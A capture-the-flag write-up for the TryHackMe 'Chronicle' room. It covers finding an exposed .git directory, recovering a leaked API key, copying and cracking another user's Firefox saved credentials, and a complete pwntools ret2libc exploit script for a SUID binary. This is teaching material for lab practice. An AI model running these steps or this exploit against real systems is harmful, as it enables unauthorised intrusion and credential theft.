# Chronicle — TryHackMe Writeup

> **TL;DR:** Exposed `.git` directory leaked an API key → credentials
> retrieved → SSH access → Firefox credentials cracked → SUID binary
> exploited via ret2libc → root shell

---

## Introduction
Chronicle is a medium-difficulty TryHackMe room that chains together
web enumeration, credential discovery, and binary exploitation to
achieve root. What makes this room interesting is that each step
naturally flows into the next — nothing feels forced.

---

## Recon
Starting with a port scan revealed two web services running side by side...

The newer site on **8081** had a password retrieval feature, but it
required an API key I didn't have yet. So I turned my attention to
the older site on **80**.

Fuzzing for hidden directories revealed something interesting:
\```bash
ffuf -u http://<ip>/.FUZZ -w /usr/share/wordlists/dirb/common.txt
# Found: .git
\```

A `.git` directory exposed on a web server means one thing —
the entire commit history is accessible.

---

## Credential Discovery
Enumerating the git history:
\```bash
git log        # list all commits
git show <id>  # inspect suspicious commit
\```

One commit contained a hardcoded API key that was later removed —
but git never forgets. Armed with the API key and a username,
the retrieval endpoint returned valid credentials.

---

## Initial Access — tommy
With credentials in hand, SSH gave us a foothold:
\```bash
ssh tommy@<ip>
cat user.txt  # first flag!
\```

---

## Lateral Movement — carlJ
Enumerating the system revealed another user, **carlJ**, with
a `.mozilla` folder — Firefox profiles store saved passwords
in encrypted form, but they can be decrypted offline.

Transferred the profile to my local machine:
\```bash
scp -r tommy@<ip>:/home/carlJ/.mozilla/firefox ./firefox
\```

Used `firefox_decrypt` but it required a master password.
Rather than guess manually, I automated it with a Python script
that tried each password from rockyou.txt until it succeeded.

Found carlJ's password and SSHed in.

---

## Privilege Escalation — ret2libc Buffer Overflow
Inside carlJ's home directory was a `mailing/` folder containing
a SUID binary called `smail`. Running it showed two options —
Send Message and Change Signature.

The word "signature" with no visible limit is a red flag for
buffer overflow.

### Binary Analysis
\```bash
checksec --file=./smail
\```
\```
NX:    enabled   → shellcode won't work, need ret2libc
PIE:   disabled  → gadget addresses are static
Stack: no canary → can overflow freely
\```

### Finding the Offset
The buffer was **64 bytes** + **8 bytes** for RBP = **72 bytes**
before we control the return address.

### Building the ROP Chain
Since NX is enabled we can't run shellcode. Instead we:
1. Return into `system()` from libc
2. Pass `/bin/sh` as the argument via the `pop rdi` gadget

\```
[72 x 'A'][ret gadget][pop rdi][/bin/sh address][system()]
     |           |          |           |              |
  overflow   alignment   set RDI    argument       shell!
\```

The `ret` gadget is needed for 16-byte stack alignment —
without it `system()` crashes on a `movaps` instruction.

### Exploit
\```python
from pwn import *

p = process('./smail')

libc_base = 0x7ffff79e2000
system    = libc_base + 0x4f550
binsh     = libc_base + 0x1b3e1a
POP_RDI   = 0x4007f3
RET       = 0x400556

payload  = b'A' * 72
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(binsh)
payload += p64(system)

p.sendlineafter(b'What do you wanna do', b'2')
p.sendlineafter(b'Write your signature...', payload)
p.interactive()
\```

---

## Conclusion
Chronicle was a great room for chaining multiple techniques together.
The key takeaways:
- Always fuzz for `.git` directories on web servers
- Firefox profiles are goldmines for credentials
- SUID binaries with unchecked input are privesc gold

## What I Learned
- `git log` for commit history enumeration
- `scp` for file transfers
- Firefox credential decryption
- ret2libc buffer overflow exploitation
- ROP chains and stack alignment in 64-bit
